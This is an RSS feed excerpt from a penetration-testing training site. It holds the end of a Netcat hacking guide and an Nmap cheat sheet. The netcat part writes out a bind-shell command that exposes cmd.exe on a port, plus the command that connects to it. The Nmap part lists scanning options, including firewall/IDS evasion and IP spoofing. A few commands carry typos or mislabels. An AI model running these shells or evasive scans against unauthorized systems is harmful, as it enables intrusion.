+<pre class="theme:familiar lang:sh decode:true ">nc.exe -nlvp 4455 -e cmd.exe</pre>
+<p><img decoding="async" class="alignnone wp-image-25331 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/14.png" alt="" width="506" height="51" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/14.png 506w, https://www.armourinfosec.com/wp-content/uploads/2020/01/14-300x30.png 300w" sizes="(max-width: 506px) 100vw, 506px" /></p>
+<p>On <strong>Kali</strong> when we will hit the listener port of <strong>Windows</strong>, we will get its Command Shell.</p>
+<pre class="theme:familiar lang:sh decode:true ">nc -v 192.168.1.200 4455</pre>
+<p><img decoding="async" class="alignnone wp-image-25332" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/15.png" alt="" width="605" height="135" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/15.png 572w, https://www.armourinfosec.com/wp-content/uploads/2020/01/15-300x67.png 300w" sizes="(max-width: 605px) 100vw, 605px" /></p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/hacking-with-netcat-a-comprehensive-guide/">Hacking with Netcat : A Comprehensive Guide</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/hacking-with-netcat-a-comprehensive-guide/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Nmap Cheat Sheet</title>
+		<link>https://www.armourinfosec.com/nmap-cheat-sheet/</link>
+					<comments>https://www.armourinfosec.com/nmap-cheat-sheet/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Sat, 25 Nov 2017 14:41:24 +0000</pubDate>
+				<category><![CDATA[Ethical Hacking]]></category>
+		<category><![CDATA[Information Gathering]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Penetration Testing]]></category>
+		<category><![CDATA[information gathering]]></category>
+		<category><![CDATA[nmap]]></category>
+		<category><![CDATA[penetration testing]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25088</guid>
+
+					<description><![CDATA[<p>Network Mapper (Nmap) also known as the God of Port Scanners used for network discovery and the basis for most...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/nmap-cheat-sheet/">Nmap Cheat Sheet</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p><strong>Network Mapper (Nmap)</strong> also known as the <strong>God of Port Scanners</strong> used for network discovery and the basis for most security enumeration during the initial stages of a <a href="https://www.armourinfosec.com/category/penetration-testing/">Penetration Testing</a>. Nmap has a multitude of options and when you first start playing with this excellent tool it can be a bit daunting. In this cheat sheet you will find a series of practical example commands for running Nmap and getting the most of this powerful tool. Below is Nmap Cheat Sheet and Helpful Tips and Techniques.</p>
+<p>Keep in mind that this cheat sheet merely touches the surface of the available options. The <a href="http://nmap.org/docs.html">Nmap Documentation portal</a> is your reference for digging deeper into the options available.</p>
+<h4><strong>Nmap in a nutshell</strong></h4>
+<ul>
+<li>Target Specification</li>
+<li>Host Discovery</li>
+<li>Port Specification</li>
+<li>Service Discovery / Version Detection</li>
+<li>Operating System Version Detection</li>
+<li>Firewall / IDS Evasion and Spoofing</li>
+<li>Time and Performance based Scan</li>
+<li>Output of Scan</li>
+<li>Vulnerability / Exploit Detection, using Nmap Scripts (NSE)</li>
+</ul>
+<h5><strong>Target Specification</strong></h5>
+<p>Scan a single IP</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap 192.168.1.1</pre>
+<p>Scan specific IPs</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap 192.168.1.1 192.168.1.5</pre>
+<p>Scan a Range</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap 192.168.1.1-254</pre>
+<p>Scan a Domain / Host</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap nmap scanme.nmap.org</pre>
+<p>Scan Targets from a File</p>
+<pre class="theme:familiar lang:sh decode:true ">namp -iL targets.txt</pre>
+<p>Exclude the Listed Host from the Target Range</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap --exclude 192.168.1.5 192.168.1.1-10</pre>
+<h5><strong>Host Discovery</strong></h5>
+<p>To List given targets only, no Scan</p>
+<pre class="theme:familiar lang:sh decode:true">nmap -sL 192.168.1.1-3</pre>
+<p>To Disable Port Scanning, Host Discovery only</p>
+<pre class="theme:familiar lang:sh decode:true">nmap -sn 192.168.1.1/24</pre>
+<p>To Disable Host Discovery. Port scan only</p>
+<pre class="theme:familiar lang:sh decode:true">nmap -Pn 192.168.1.1-5</pre>
+<p>TCP SYN discovery on given port</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -PS 80,21 192.168.1.1</pre>
+<p>TCP ACK discovery on given port</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -PA 80,21 192.168.1.1</pre>
+<p>UDP discovery on given port</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -PU 53 192.168.1.1</pre>
+<h5><strong>Port Specification</strong></h5>
+<p>Scan a given Port (i.e 21 here)</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -p 21 192.168.1.1</pre>
+<p>Scan the given Port Range</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -p 21-100 192.168.1.1</pre>
+<p>Scan the multiple TCP and UDP ports</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -p U:53,T:21-25,80 192.168.1.1</pre>
+<p>Scan all 65535 ports</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -p- 192.168.1.1</pre>
+<p>Scans the given Service Name</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -p http,https 192.168.1.1</pre>
+<p>Scans the Top 100 ports</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -F 192.168.1.1</pre>
+<h5><strong>Service Discovery / Version Detection</strong></h5>
+<p>Detect Version of the Running Services</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -sV 192.168.1.1</pre>
+<p>To set intensity range between 0 to 9. Higher number increases possibility of correctness</p>
+<pre class="theme:familiar lang:sh decode:true">nmap -sV --version-intensity 5 192.168.1.1</pre>
+<p>To enable the light mode(intensity =2). It is faster but have less possibility of correctness</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap  -sV --version-light 192.168.1.1</pre>
+<p>To enables the intense mode(intensity =9). It is slower but have more possibility of correctness</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -sV --version-all 192.168.1.1</pre>
+<h5><strong>Operating System Version Detection</strong></h5>
+<p>Detect the Operating system</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -sV 192.168.1.1</pre>
+<p>Aggressive mode i.e OS, Service Version, Trace route.</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -A 192.168.1.1</pre>
+<h5><strong>Firewall / IDS Evasion and Spoofing</strong></h5>
+<p>Use tiny fragmented IP packets. Its harder for packet filters</p>
+<pre class="theme:familiar lang:default decode:true">nmap -f 192.168.1.1</pre>
+<p>Used to set our own offset size</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap --mtu 32 192.168.1.1</pre>
+<p>Use the Spoofed IP to scan</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -D decoy-ip1,decoy-ip2, your-own-ip remote-host-ip</pre>
+<p>Scans target.com from example.com (Domain Name Spoofing)</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -S example.com target.com</pre>
+<p>Uses the given port as a source</p>
+<pre class="theme:familiar lang:sh decode:true">nmap -g 53 192.168.1.1</pre>
+<p>Appends random data to sent packets</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap --data-length 200 192.168.1.1</pre>
+<h5><strong>Time and Performance based Scan</strong></h5>
+<p>Slow scan</p>
+<pre class="theme:familiar lang:sh decode:true">nmap -T0 192.168.1.1</pre>
+<p>Sneaky scan</p>
+<pre class="theme:familiar lang:sh decode:true">nmap -T1 192.168.1.1</pre>
+<p>Timely scan</p>
+<pre class="theme:familiar lang:sh decode:true">nmap -T2 192.168.1.1</pre>
+<p>Default scan</p>
+<pre class="theme:familiar lang:sh decode:true">nmap -T3 192.168.1.1</pre>
+<p>Aggressive scan</p>
+<pre class="theme:familiar lang:sh decode:true">nmap -T4 192.168.1.1</pre>
+<p>Very Aggressive scan</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -T5 192.168.1.1</pre>
+<h5><strong>Output of Scan</strong></h5>
+<p>To scan in the Verbose mode (-vv for greater effect)</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap -v 192.168.1.1</pre>
+<p>Save the scan results to the scan.file</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap 192.168.1.1 -oN scan.file</pre>
+<p>Save the results in xml.file</p>
+<pre class="theme:familiar lang:sh decode:true">nmap 192.168.1.1 -oX xml.file</pre>
+<p>Save the results in grep.file</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap 192.168.1.1 -oG grep.file</pre>
+<p>Saves the Output in the three major formats at once</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap 192.168.1.1 -oA result</pre>
+<p>To scan in the debug mode (-dd for greater effect)</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap 192.168.1.1 -d</pre>
+<p>To see all the packets sent and received</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap 192.168.1.1 -T4 --packet-trace</pre>
+<h5><strong>Vulnerability / Exploit Detection, using Nmap Scripts (NSE)</strong></h5>
+<p>Scan with default NSE Scripts</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap 192.168.1.1 -sC</pre>
+<p>Scan with given NSE Script ( Example: nmap.nse )</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap 192.168.1.1 --script=nmap.nse</pre>
+<p>Use script with arguments</p>
+<pre class="theme:familiar lang:sh decode:true ">nmap 192.168.1.1 –script=nmap.nse --script-args user=admin</pre>
+<p>&nbsp;</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/nmap-cheat-sheet/">Nmap Cheat Sheet</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/nmap-cheat-sheet/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
